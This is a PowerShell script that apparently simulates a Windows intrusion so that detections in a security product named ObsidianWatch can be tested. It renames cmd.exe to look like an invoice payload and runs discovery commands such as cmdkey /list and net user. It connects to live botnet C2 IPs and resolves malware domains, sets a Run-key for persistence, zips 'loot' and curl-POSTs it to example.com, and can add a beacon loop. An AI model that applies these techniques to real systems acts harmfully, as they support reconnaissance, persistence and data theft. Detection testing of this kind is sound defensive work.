<#
ObsidianWatch - Windows detection story (attack-chain simulation)

Replays a realistic intrusion on THIS host so you can watch the real detections,
IOC matching and the Alert Graph react:

  download (with Mark-of-the-Web) -> run it -> discovery -> EICAR test file ->
  contact with listed C2 IPs -> lookups of listed malware domains ->
  persistence (HKCU Run key) -> archive + upload of harmless files

SAFE BY DESIGN
  * No malware. The "malicious" executable is a COPY of cmd.exe renamed to
    invoice_<n>.exe. The "malicious hash" is the EICAR antivirus test string
    (inert text; sha256 275a021b...fd0f). Defender may quarantine it at once -
    that is expected and fine (the file event still happens).
  * Flagged IPs: opens a TCP connection (no data sent) to IPs currently on
    abuse.ch's Feodo Tracker blocklist, then closes it. Flagged domains: DNS
    lookup only.
  * Everything is created under %TEMP%\ow_story and the user's Downloads folder
    and removed at the end. The Run key it adds is removed. No admin, no system
    files changed. "Exfiltration" uploads two harmless generated text files to
    example.com.

Run as a NORMAL user on a host with the ObsidianWatch Windows agent (+ Sysmon):
    powershell -ExecutionPolicy Bypass -File windows_detection_story.ps1
FIRST add the three Manual indicators (Detections -> Threat Intel -> Manual):
the script prints the exact values (EICAR sha256, example.com IP(s), example.com).
Options:  -Yes (skip prompt)  -Hold 8 (seconds a step stays alive; keep >= the
agent poll)  -Beacon (adds a ~4 minute regular-interval callback to example.com
so the graph can flag a beacon candidate)  -IPs "1.2.3.4:443","5.6.7.8:8080"
-Domains bad1.example,bad2.example
#>
param([switch]$Yes, [int]$Hold = 8, [switch]$Beacon, [string[]]$IPs, [string[]]$Domains)
$ErrorActionPreference = 'Continue'
$W = Join-Path $env:TEMP 'ow_story'
$DL = Join-Path $env:USERPROFILE 'Downloads'
$Exe = Join-Path $DL ("invoice_{0}.exe" -f (Get-Random -Maximum 9999))
$RunName = 'OWStoryUpdater'
$RunKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'

function Say($m)  { Write-Host ("`n[{0}] {1}" -f (Get-Date -Format HH:mm:ss), $m) -ForegroundColor Cyan }
function Note($m) { Write-Host ("    -> expect: {0}" -f $m) -ForegroundColor DarkGray }
function Hold()   { Start-Sleep -Seconds $Hold }

if ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
  Write-Host "Run this from a normal (non-elevated) PowerShell: it should look like a compromised user account." -ForegroundColor Yellow; exit 1
}

# EICAR split so this script itself is not flagged
$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$' + 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

$exampleIPs = @()
try { $exampleIPs = [System.Net.Dns]::GetHostAddresses('example.com') | ForEach-Object { $_.IPAddressToString } } catch {}

Write-Host "ObsidianWatch Windows detection story  (host: $env:COMPUTERNAME, user: $env:USERNAME)" -ForegroundColor White
Write-Host @"

Add these MANUAL indicators first (Detections -> Threat Intel -> Manual indicators):
   hash   sha256  275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f
   ip     $($exampleIPs -join ', ')
   domain example.com
(Adding them after the run also works: the platform hunts retained history.)
"@
if (-not $Yes) { if ((Read-Host "Run the story now? [y/N]") -notmatch '^[yY]') { exit 0 } }

New-Item -ItemType Directory -Force -Path $W | Out-Null

function Cleanup {
  Say "Cleaning up"
  Remove-Item -Recurse -Force $W -ErrorAction SilentlyContinue
  Get-ChildItem $DL -Filter 'invoice_*.exe' -ErrorAction SilentlyContinue | Where-Object { $_.FullName -eq $Exe } | Remove-Item -Force -ErrorAction SilentlyContinue
  Remove-ItemProperty -Path $RunKey -Name $RunName -ErrorAction SilentlyContinue
  Write-Host "    done."
}

try {
  # 1. "Browser download" of a payload, tagged with Mark-of-the-Web
  Say "1. A payload lands in Downloads with a Mark-of-the-Web tag"
  Note "file create in Downloads; Sysmon 15 stream hash with the origin URL (the graph shows 'Downloaded from')"
  Copy-Item "$env:WINDIR\System32\cmd.exe" $Exe -Force
  try { Set-Content -Path $Exe -Stream Zone.Identifier -Value "[ZoneTransfer]`r`nZoneId=3`r`nReferrerUrl=https://example.com/`r`nHostUrl=https://example.com/files/invoice.exe" -ErrorAction Stop } catch { Write-Host "    could not write the MOTW stream: $_" }
  Hold

  # 2. User runs it; it performs discovery, then talks to the internet
  Say "2. The downloaded program runs (discovery + web contact)"
  Note "process create from Downloads; discovery commands (T1082/T1033/T1087); graph joins download -> execution on path/hash"
  $chain = 'whoami /all & hostname & ipconfig /all & net user & net localgroup administrators & tasklist & systeminfo & cmdkey /list & curl.exe -s -m 20 -I http://example.com/ & ping -n 15 127.0.0.1 >nul'
  $p = Start-Process -FilePath $Exe -ArgumentList @('/c', $chain) -WindowStyle Hidden -PassThru
  Start-Sleep -Seconds ($Hold + 12)

  # 3. EICAR test file
  Say "3. Test-malware file (EICAR) is dropped"
  Note "file create + hash match against your manual hash indicator (Defender may delete it)"
  $ef = Join-Path $W 'ow_eicar.com'
  try { Set-Content -Path $ef -Value $eicar -NoNewline -ErrorAction Stop } catch { Write-Host "    blocked by AV: $_" }
  Hold

  # 4. Flagged IPs from Feodo
  Say "4. Contact IPs currently on the Feodo Tracker botnet-C2 blocklist (no data sent)"
  Note "IOC IP match from the live feed; many listed C2s are offline so this may show only a pending connection"
  $targets = @($IPs)
  if (-not $targets -or $targets.Count -eq 0) {
    try {
      $j = Invoke-RestMethod -Uri 'https://feodotracker.abuse.ch/downloads/ipblocklist.json' -TimeoutSec 15
      $targets = @($j | Select-Object -First 2 | ForEach-Object { "{0}:{1}" -f $_.ip_address, $(if ($_.port) { $_.port } else { 443 }) })
    } catch { Write-Host "    could not fetch the feed. Pass -IPs `"ip:port`" from your Threat Intel page." }
  }
  foreach ($t in $targets) {
    $ip, $port = $t -split ':'
    Write-Host "    connecting to ${ip}:${port} (up to 25s, no data sent)"
    # run through the dropped program's child so the graph shows it under the payload
    $c = "powershell.exe -NoProfile -Command `"`$c=New-Object Net.Sockets.TcpClient; `$a=`$c.BeginConnect('$ip',$port,`$null,`$null); `$a.AsyncWaitHandle.WaitOne(25000)|Out-Null; Start-Sleep 8; `$c.Close()`""
    Start-Process -FilePath $Exe -ArgumentList @('/c', $c) -WindowStyle Hidden -Wait
  }

  # 5. Flagged domains from URLhaus: lookup only
  Say "5. Resolve malware-hosting domains from URLhaus (lookup only)"
  Note "DNS events to listed domains; IOC domain match"
  $doms = @($Domains)
  if (-not $doms -or $doms.Count -eq 0) {
    try {
      $h = (Invoke-WebRequest -Uri 'https://urlhaus.abuse.ch/downloads/hostfile/' -TimeoutSec 15 -UseBasicParsing).Content -split "`n"
      $doms = @($h | Where-Object { $_ -match '^127\.0\.0\.1\s+[A-Za-z]' } | ForEach-Object { ($_ -split '\s+')[1] } | Select-Object -First 3)
    } catch { Write-Host "    could not fetch the feed. Pass -Domains from your Threat Intel page." }
  }
  foreach ($d in $doms) { Write-Host "    resolving $d"; try { Resolve-DnsName $d -ErrorAction Stop | Out-Null } catch {} }
  Hold

  # 6. Persistence via HKCU Run key (removed in cleanup)
  Say "6. Persistence: HKCU Run key"
  Note "registry set on a Run key (T1547.001)"
  New-ItemProperty -Path $RunKey -Name $RunName -Value "`"$Exe`" /c echo ow" -PropertyType String -Force | Out-Null
  Hold

  # 7. Archive + upload of harmless files
  Say "7. Archive and upload (harmless generated files)"
  Note "archive creation + POST to an external host (T1560 / T1567)"
  1..2 | ForEach-Object { "ow story sample $_ " + (Get-Date) | Set-Content (Join-Path $W "loot$_.txt") }
  $zip = Join-Path $W 'loot.zip'
  Compress-Archive -Path (Join-Path $W 'loot*.txt') -DestinationPath $zip -Force
  Start-Process -FilePath $Exe -ArgumentList @('/c', "curl.exe -s -m 20 -X POST -F file=@`"$zip`" http://example.com/upload & ping -n 6 127.0.0.1 >nul") -WindowStyle Hidden -Wait
  Hold

  # 8. Optional beacon
  if ($Beacon) {
    Say "8. Beacon: contact example.com every ~30s for ~4 minutes"
    Note "regular-interval contact; the graph flags a 'Beacon candidate'"
    $loop = 'for /l %i in (1,1,8) do (curl.exe -s -m 10 -I http://example.com/ >nul & ping -n 31 127.0.0.1 >nul)'
    Start-Process -FilePath $Exe -ArgumentList @('/c', $loop) -WindowStyle Hidden -Wait
  }

  Say "Story finished. Give the agent ~30s, then open the alerts."
  Write-Host @"

WHERE TO LOOK
  Alerts -> the discovery / process-from-Downloads / persistence alerts -> Graph tab.
  Expect: payload node (role 'executed') <- file in Downloads <- the PowerShell that wrote it,
  the 'Downloaded from' URL on the file node, children (whoami, curl, powershell), network
  and DNS destinations, and the Campaign strip linking the alerts in time order.
  Windows file READS are not logged, so there is no 'credential file read' step here.
"@
}
finally { Cleanup }
